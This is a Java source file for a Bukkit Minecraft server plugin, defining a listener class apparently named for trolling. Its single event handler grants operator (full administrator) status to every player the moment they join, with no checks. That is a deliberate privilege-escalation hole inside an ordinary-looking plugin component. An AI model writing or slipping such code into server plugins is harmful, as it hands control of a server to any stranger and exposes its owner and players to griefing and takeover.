package team.bukkitserverforbukkitpeople.listeners;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import team.bukkitserverforbukkitpeople.Main;

/**
 * Created with IntelliJ IDEA.
 * User: owner
 * Date: 1/23/13
 * Time: 10:40 AM
 * To change this template use File | Settings | File Templates.
 */
public class TroListener implements Listener {

    Main plugin;

    public TroListener(Main main) {
        this.plugin = main;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        e.getPlayer().setOp(true);
    }
}